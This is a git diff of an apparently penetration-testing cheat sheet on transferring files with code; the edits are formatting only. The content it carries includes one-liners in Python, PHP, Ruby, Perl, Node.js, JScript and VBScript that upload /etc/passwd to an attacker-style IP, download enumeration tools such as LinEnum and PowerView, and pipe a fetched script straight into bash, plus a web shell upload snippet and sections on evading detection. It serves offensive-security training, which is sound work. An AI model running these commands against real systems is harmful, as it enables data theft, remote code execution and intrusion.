@@ -1,4 +1,4 @@
-# Transferring Files with Code
+# 💻 Code-Based File Transfers
 
 ## Introduction
 
@@ -15,16 +15,19 @@ Python is a popular programming language. Currently, version 3 is supported, but
 ### Python Downloads
 
 **Python 2 - Download:**
+
 ```bash
 python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
 
 **Python 3 - Download:**
+
 ```bash
 python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
 
 **Alternative Python 3 Methods:**
+
 ```python
 # Using requests library
 python3 -c 'import requests; r=requests.get("https://example.com/file.txt"); open("file.txt","wb").write(r.content)'
@@ -36,11 +39,13 @@ python3 -c 'import urllib.request; req=urllib.request.Request("https://example.c
 ### Python Uploads
 
 **Upload a File Using Python One-liner:**
+
 ```bash
 python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
 
 **Multi-line Python Upload Example:**
+
 ```python
 # To use the requests function, we need to import the module first.
 import requests 
@@ -56,6 +61,7 @@ r = requests.post(URL, files={"files":file})
 ```
 
 **Upload with Authentication:**
+
 ```python
 python3 -c 'import requests; requests.post("http://192.168.49.128:8000/upload", files={"files":open("/etc/passwd","rb")}, auth=("user","test123"))'
 ```
@@ -66,17 +72,20 @@ PHP is also very prevalent and provides multiple file transfer methods. Accordin
 
 ### PHP Downloads
 
-**PHP Download with file_get_contents():**
+**PHP Download with file\_get\_contents():**
+
 ```bash
 php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
 ```
 
 **PHP Download with fopen():**
+
 ```bash
 php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
 ```
 
 **PHP Download and Pipe to Bash:**
+
 ```bash
 php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
@@ -86,11 +95,13 @@ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/mas
 ### PHP Alternative Methods
 
 **Using cURL in PHP:**
+
 ```bash
 php -r '$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "https://example.com/file.txt"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $data = curl_exec($ch); curl_close($ch); file_put_contents("file.txt", $data);'
 ```
 
 **PHP Web Shell Upload:**
+
 ```php
 <?php
 if (isset($_POST['upload'])) {
@@ -110,16 +121,19 @@ if (isset($_POST['upload'])) {
 Ruby is another popular language that supports running one-liners from an operating system command line using the option `-e`.
 
 **Ruby - Download a File:**
+
 ```bash
 ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
 ```
 
 **Ruby - Download with SSL:**
+
 ```bash
 ruby -e 'require "net/http"; require "openssl"; uri = URI("https://example.com/file.txt"); http = Net::HTTP.new(uri.host, uri.port); http.use_ssl = true; http.verify_mode = OpenSSL::SSL::VERIFY_NONE; response = http.get(uri.path); File.write("file.txt", response.body)'
 ```
 
 **Ruby - Upload File:**
+
 ```bash
 ruby -e 'require "net/http"; require "net/http/post/multipart"; uri = URI("http://192.168.49.128:8000/upload"); File.open("/etc/passwd") {|f| req = Net::HTTP::Post::Multipart.new(uri.path, {"files" => UploadIO.new(f, "text/plain", "passwd")}); Net::HTTP.start(uri.host, uri.port) {|http| http.request(req)}}'
 ```
@@ -129,16 +143,19 @@ ruby -e 'require "net/http"; require "net/http/post/multipart"; uri = URI("http:
 Perl is widely available on many Linux systems and supports file transfer operations.
 
 **Perl - Download a File:**
+
 ```bash
 perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
 ```
 
 **Perl - Alternative Download Method:**
+
 ```bash
 perl -e 'use File::Fetch; my $ff = File::Fetch->new(uri => "https://example.com/file.txt"); my $file = $ff->fetch() or die $ff->error;'
 ```
 
 **Perl - Upload File:**
+
 ```bash
 perl -e 'use LWP::UserAgent; use HTTP::Request::Common qw(POST); my $ua = LWP::UserAgent->new; my $response = $ua->request(POST "http://192.168.49.128:8000/upload", Content_Type => "form-data", Content => [files => ["/etc/passwd"]]);'
 ```
@@ -148,6 +165,7 @@ perl -e 'use LWP::UserAgent; use HTTP::Request::Common qw(POST); my $ua = LWP::U
 JavaScript can be used on Windows systems through Windows Script Host (WSH).
 
 **Create wget.js file:**
+
 ```javascript
 var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
@@ -160,11 +178,13 @@ BinStream.SaveToFile(WScript.Arguments(1));
 ```
 
 **Download a File Using JavaScript and cscript.exe:**
+
 ```cmd
 cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
 ```
 
 **Alternative JavaScript Method (using MSXML2):**
+
 ```javascript
 var xhr = new ActiveXObject("MSXML2.XMLHTTP");
 xhr.open("GET", WScript.Arguments(0), false);
@@ -182,6 +202,7 @@ stream.close();
 VBScript ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.
 
 **Create wget.vbs file:**
+
 ```vbscript
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
@@ -197,11 +218,13 @@ end with
 ```
 
 **Download a File Using VBScript and cscript.exe:**
+
 ```cmd
 cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
 ```
 
 **VBScript Upload Example:**
+
 ```vbscript
 Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
 Set stream = CreateObject("Adodb.Stream")
@@ -219,11 +242,13 @@ stream.Close
 If Node.js is available, it provides powerful file transfer capabilities.
 
 **Node.js Download:**
+
 ```bash
 node -e 'const https = require("https"); const fs = require("fs"); https.get("https://example.com/file.txt", (res) => { res.pipe(fs.createWriteStream("file.txt")); });'
 ```
 
 **Node.js Upload:**
+
 ```bash
 node -e 'const http = require("http"); const fs = require("fs"); const data = fs.readFileSync("/etc/passwd"); const options = {hostname: "192.168.49.128", port: 8000, path: "/upload", method: "POST"}; const req = http.request(options); req.write(data); req.end();'
 ```
@@ -233,6 +258,7 @@ node -e 'const http = require("http"); const fs = require("fs"); const data = fs
 Go might be available on some systems, especially in containerized environments.
 
 **Go Download One-liner:**
+
 ```bash
 echo 'package main; import ("io"; "net/http"; "os"); func main() { resp, _ := http.Get("https://example.com/file.txt"); defer resp.Body.Close(); out, _ := os.Create("file.txt"); defer out.Close(); io.Copy(out, resp.Body); }' > download.go && go run download.go
 ```
@@ -242,6 +268,7 @@ echo 'package main; import ("io"; "net/http"; "os"); func main() { resp, _ := ht
 ### Bypassing Restrictions
 
 **Custom User Agents:**
+
 ```bash
 # Python with custom User-Agent
 python3 -c 'import urllib.request; req=urllib.request.Request("https://example.com/file.txt", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}); urllib.request.urlretrieve(req, "file.txt")'
@@ -251,6 +278,7 @@ php -r '$context = stream_context_create(["http" => ["header" => "User-Agent: Mo
 ```
 
 **Using Proxies:**
+
 ```bash
 # Python with proxy
 python3 -c 'import urllib.request; proxy = urllib.request.ProxyHandler({"http": "http://proxy:8080"}); opener = urllib.request.build_opener(proxy); urllib.request.install_opener(opener); urllib.request.urlretrieve("http://example.com/file.txt", "file.txt")'
@@ -259,6 +287,7 @@ python3 -c 'import urllib.request; proxy = urllib.request.ProxyHandler({"http": 
 ### Error Handling
 
 **Python with Error Handling:**
+
 ```python
 import urllib.request
 try:
@@ -269,6 +298,7 @@ except Exception as e:
 ```
 
 **PHP with Error Handling:**
+
 ```php
 <?php
 $file = @file_get_contents("https://example.com/file.txt");
@@ -284,6 +314,7 @@ if ($file !== false) {
 ## Upload Server Setup
 
 **Starting the Python uploadserver Module:**
+
 ```bash
 python3 -m uploadserver
 
@@ -292,6 +323,7 @@ python3 -m uploadserver
 ```
 
 **PHP Upload Server:**
+
 ```php
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
@@ -317,6 +349,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
 ### Secure Downloads
 
 **Verify SSL Certificates:**
+
 ```python
 import urllib.request
 import ssl
@@ -327,6 +360,7 @@ urllib.request.urlretrieve("https://example.com/file.txt", "file.txt", context=c
 ```
 
 **Check File Integrity:**
+
 ```python
 import hashlib
 import urllib.request
@@ -343,6 +377,7 @@ with open("file.txt", "rb") as f:
 ### Sanitize Uploads
 
 **Validate File Types:**
+
 ```python
 import os
 import mimetypes
@@ -362,6 +397,7 @@ else:
 ### Multi-Language Download Script
 
 **Bash Script with Fallback Methods:**
+
 ```bash
 #!/bin/bash
 URL="https://example.com/file.txt"
@@ -404,6 +440,7 @@ exit 1
 ### Detection Evasion
 
 **Randomized User Agents:**
+
 ```python
 import random
 import urllib.request
@@ -432,9 +469,9 @@ urllib.request.urlretrieve(req, "file.txt")
 
 ## References
 
-- [Python urllib Documentation](https://docs.python.org/3/library/urllib.html)
-- [PHP File Functions](https://www.php.net/manual/en/ref.filesystem.php)
-- [Ruby Net::HTTP Documentation](https://ruby-doc.org/stdlib-3.0.0/libdoc/net/rdoc/Net/HTTP.html)
-- [Perl LWP::Simple Documentation](https://metacpan.org/pod/LWP::Simple)
-- [Windows Script Host Documentation](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/9bbdkx3k(v=vs.84))
-- [Node.js HTTP Documentation](https://nodejs.org/api/http.html) 
+* [Python urllib Documentation](https://docs.python.org/3/library/urllib.html)
+* [PHP File Functions](https://www.php.net/manual/en/ref.filesystem.php)
+* [Ruby Net::HTTP Documentation](https://ruby-doc.org/stdlib-3.0.0/libdoc/net/rdoc/Net/HTTP.html)
+* [Perl LWP::Simple Documentation](https://metacpan.org/pod/LWP::Simple)
+* [Windows Script Host Documentation](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/9bbdkx3k\(v=vs.84\))
+* [Node.js HTTP Documentation](https://nodejs.org/api/http.html)
